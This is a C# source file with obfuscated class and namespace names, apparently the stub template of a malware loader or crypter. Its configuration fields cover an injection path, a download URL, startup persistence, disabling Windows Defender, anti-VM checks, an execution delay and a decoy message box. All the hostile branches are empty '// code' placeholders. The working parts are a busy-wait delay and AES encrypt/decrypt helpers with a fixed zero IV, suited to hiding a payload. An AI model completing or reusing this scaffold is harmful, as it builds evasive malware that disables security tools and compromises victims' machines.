using System;
using System.Reflection;
using System.Net;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace Bokgimiacaba
{
    internal static partial class Bencebokgibi
    {

        [STAThread]
        private static void Main()
        {

            string injectionPath = @"";
            string url = @"";
            bool startup = false;
            bool killWindowsDefender = false;
            bool antiVM = false;
            int delay = 0;
            bool messageBox = false;
            string messageBoxTitle = "";
            string messageBoxBody = "";

            var dateSecs = DateTime.Now.AddSeconds(delay);

            while (DateTime.Now < dateSecs)
            {
                int integer = 0;
            }

            if (startup)
            {
                // code
            }

            if (killWindowsDefender)
            {
                // code
            }

            if (antiVM)
            {
                // code
            }

            if (messageBox)
            {
                // code
            }

           
        }

        public static string Encrypt(string plainText, string key)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }

        public static string Decrypt(string cipherText, string key)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }

}